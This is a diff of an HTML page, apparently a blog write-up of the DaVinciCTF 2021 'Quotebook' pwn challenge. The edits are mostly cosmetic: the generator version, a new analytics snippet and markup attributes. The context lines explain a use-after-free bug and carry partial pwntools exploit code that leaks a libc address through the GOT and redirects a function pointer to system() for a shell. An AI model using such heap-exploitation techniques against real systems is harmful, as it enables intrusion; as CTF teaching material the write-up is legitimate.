@@ -3,23 +3,21 @@
   <head>
     <title>[DaVinciCTF 2021 - pwn] Quotebook // ret2school</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="generator" content="Hugo 0.92.2" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="nasm" />
     <meta name="description" content="" />
     <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
 
     
-<script type="application/javascript">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8K5XT0SJN8"></script>
+<script>
 var doNotTrack = false;
 if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'G-8K5XT0SJN8', 'auto');
-	
-	ga('send', 'pageview');
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8K5XT0SJN8', { 'anonymize_ip': false });
 }
 </script>
 
@@ -36,9 +34,10 @@ nc challs.dvc.tf 2222
 nc challs.dvc.tf 2222
  We are given the binary, the source code for it and the libc used on the server. We&rsquo;ll need to find a vuln into the binary to get a shell and grab a flag from the server (typical pwn task)." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ret2school.github.io/post/dvctf_quotebook/" />
+<meta property="og:url" content="https://ret2school.github.io/post/dvctf_quotebook/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2021-03-15T00:00:00+00:00" />
 <meta property="article:modified_time" content="2021-03-15T00:00:00+00:00" />
+
 
 
   </head>
@@ -111,7 +110,7 @@ nc challs.dvc.tf 2222
 <p>We are given the binary, the source code for it and the libc used on the server. We&rsquo;ll need to find a vuln into the binary to get a shell and grab a flag from the server (typical pwn task).</p>
 <h2 id="source-analysis">Source analysis</h2>
 <p>When looking at the source code, we can see that a quote is defined like this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> quote_t quote_t;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> quote_t quote_t;
 <span style="color:#ff79c6">struct</span> quote_t
 {
     <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span> content;
@@ -122,11 +121,11 @@ nc challs.dvc.tf 2222
     <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">*</span>read)(quote_t <span style="color:#ff79c6">*</span>);
 };
 </code></pre></div><p>and we have an array to store the quotes with a variable which indexes the &ldquo;current&rdquo; quote:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">quote_t <span style="color:#ff79c6">*</span> book[NB_PAGE];
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">quote_t <span style="color:#ff79c6">*</span> book[NB_PAGE];
 <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> book_ctr;
 </code></pre></div><p>So, when a quote is created, a buffer of <code>sizeof(quote_t)</code> is allocated, then the program asks the title and content size, to allocate buffers from the given size. Then the title and contents are read from <code>stdin</code>.</p>
 <p>The interesting things happen when freeing a quote:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#8be9fd">int</span> choice <span style="color:#ff79c6">=</span> get_choice(<span style="color:#f1fa8c">&#34;Quote number&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#8be9fd">int</span> choice <span style="color:#ff79c6">=</span> get_choice(<span style="color:#f1fa8c">&#34;Quote number&#34;</span>);
     <span style="color:#ff79c6">if</span>(choice <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">||</span> choice <span style="color:#ff79c6">&gt;=</span> book_ctr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>)
     {
         puts(<span style="color:#f1fa8c">&#34;[!] Error : wrong quote number !&#34;</span>);
@@ -141,35 +140,35 @@ So from there we can trigger an use-after-free vulnerability.</p>
 <h2 id="leaking-libc-address">Leaking libc address</h2>
 <p>If we create a quote and destroy it afterwards, the <code>book</code> array still contains the address of the freed buffer. This means that if we can control program allocations, then we can write anything we want on that buffer, while the program still believes it&rsquo;s a <code>quote_t</code> structure.</p>
 <p>And remember, we can allocate buffers from the size we want while creating a quote, and write what we want on it. And since we can list quotes:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">quote_read</span>(quote_t <span style="color:#ff79c6">*</span> quote)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">quote_read</span>(quote_t <span style="color:#ff79c6">*</span> quote)
 {
     printf(<span style="color:#f1fa8c">&#34;[+] %s&#34;</span>, quote<span style="color:#ff79c6">-&gt;</span>title);
     printf(<span style="color:#f1fa8c">&#34;[&gt;] %s&#34;</span>, quote<span style="color:#ff79c6">-&gt;</span>content);
 }
 </code></pre></div><p>, if <code>content</code> or <code>title</code> point to the binary&rsquo;s GOT section, then we can leak a libc&rsquo;s function address, and then getting the libc base.</p>
 <p>But we have to be careful, because <code>book_ctr</code> is decremented, if we only create one quote and remove it, its pointer will be overwritten by the new quote we create. So let&rsquo;s create 3 quotes, with buffers of size 1. The heap will look like something like this:</p>
-<pre><code>-----------------------------------------------
+<pre tabindex="0"><code>-----------------------------------------------
 | first struct | second struct | third struct |
 -----------------------------------------------
     book[0]        book[1]         book[2]
 </code></pre><p>The small buffers we allocated are placed in another heap arena (since they are 1 bytes long)</p>
 <p>Now, we&rsquo;ll delete the first two structs, the heap will now look like this:</p>
-<pre><code>------------------------------------------------
+<pre tabindex="0"><code>------------------------------------------------
 | freed chunk  |  freed chunk  |  third struct |
 ------------------------------------------------
     book[0]        book[1]         book[2]
 </code></pre><p>And this time we&rsquo;ll create a new quote (on <code>book[book_ctr]</code>), but with a sizeof(quote) length, so the heap will look like this:</p>
-<pre><code>------------------------------------------------
+<pre tabindex="0"><code>------------------------------------------------
 | book1 buffer |  freed chunk  |  third struct |
 ------------------------------------------------
     book[0]        book[1]         book[2]
 </code></pre><p>We can clearly see that the freed chunk pointed by book[0] contains the second&rsquo;s quote buffer, and we can craft a fake <code>quote_t</code> struct with program&rsquo;s GOT  as title pointer.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4"># Craft UAF with title overwriting first quote_t structure</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4"># Craft UAF with title overwriting first quote_t structure</span>
 s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;2&#34;</span>)
-<span style="color:#ff79c6">print</span>(s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;size &gt; &#39;</span>))
+<span style="color:#8be9fd;font-style:italic">print</span>(s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;size &gt; &#39;</span>))
 <span style="color:#6272a4"># title size</span>
 s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;1&#34;</span>)
-<span style="color:#ff79c6">print</span>(s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39; size &gt; &#39;</span>))
+<span style="color:#8be9fd;font-style:italic">print</span>(s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39; size &gt; &#39;</span>))
 <span style="color:#6272a4"># content size</span>
 s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;48&#34;</span>)
 s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;Title &gt; &#39;</span>)
@@ -186,21 +185,21 @@ buf <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span
 
 <span style="color:#6272a4"># Send title</span>
 s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;a&#34;</span>)
-<span style="color:#ff79c6">print</span>(<span style="color:#8be9fd;font-style:italic">str</span>(s<span style="color:#ff79c6">.</span>recv(), <span style="color:#f1fa8c">&#39;ascii&#39;</span>))
+<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#8be9fd;font-style:italic">str</span>(s<span style="color:#ff79c6">.</span>recv(), <span style="color:#f1fa8c">&#39;ascii&#39;</span>))
 
 <span style="color:#6272a4"># Send content</span>
 s<span style="color:#ff79c6">.</span>sendline(buf)
-<span style="color:#ff79c6">print</span>(<span style="color:#8be9fd;font-style:italic">str</span>(s<span style="color:#ff79c6">.</span>recv(), <span style="color:#f1fa8c">&#39;ascii&#39;</span>))
+<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#8be9fd;font-style:italic">str</span>(s<span style="color:#ff79c6">.</span>recv(), <span style="color:#f1fa8c">&#39;ascii&#39;</span>))
 
 <span style="color:#6272a4"># Display quote and trigger UAF</span>
 s<span style="color:#ff79c6">.</span>recv()
 s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;3&#34;</span>)
-<span style="color:#ff79c6">print</span>(s<span style="color:#ff79c6">.</span>recv())
+<span style="color:#8be9fd;font-style:italic">print</span>(s<span style="color:#ff79c6">.</span>recv())
 s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;1&#34;</span>)
 s<span style="color:#ff79c6">.</span>recvline()
 leak <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvline() <span style="color:#6272a4"># quote contents contain printf addr</span>
 </code></pre></div><p>This way we can get the glibc&rsquo;s printf address, and compute system() address by doing:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">leak <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvline()
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">leak <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvline()
 puts_leak <span style="color:#ff79c6">=</span> leak[<span style="color:#bd93f9">4</span>:<span style="color:#bd93f9">4</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">6</span>]
 addr <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>unpack(puts_leak, <span style="color:#8be9fd;font-style:italic">len</span>(puts_leak)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>)
 libc_base <span style="color:#ff79c6">=</span> addr <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#34;printf&#34;</span>]
@@ -209,7 +208,7 @@ system_addr <span style="color:#ff79c6">=</span> libc_base <span style="color:#f
 <h2 id="pwning-the-app-and-getting-a-shell">Pwning the app and getting a shell</h2>
 <p>Fortunately , the program allows us to edit a quote, this basically means replacing the old buffer&rsquo;s content by something else. Also, the program contains function pointers that we can overwrite to redirect to any address we want since we can craft a whole quote_t structure.</p>
 <p>The function pointers have this prototype:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">*</span>write)(quote_t <span style="color:#ff79c6">*</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">*</span>write)(quote_t <span style="color:#ff79c6">*</span>);
     <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">*</span>read)(quote_t <span style="color:#ff79c6">*</span>);
 </code></pre></div><p>So it would be nice to redirect the control flow to a function which takes one argument, and luckily we have: <code>system(char *command)</code> to do this.</p>
 <p>So to get a shell we need to:</p>
@@ -220,7 +219,7 @@ system_addr <span style="color:#ff79c6">=</span> libc_base <span style="color:#f
 <li>???</li>
 <li>PROFIT</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4"># Edit the second quote so we can control first&#39;s quote buffer</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4"># Edit the second quote so we can control first&#39;s quote buffer</span>
 s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;4&#34;</span>)
 s<span style="color:#ff79c6">.</span>recv()
 s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;2&#34;</span>)
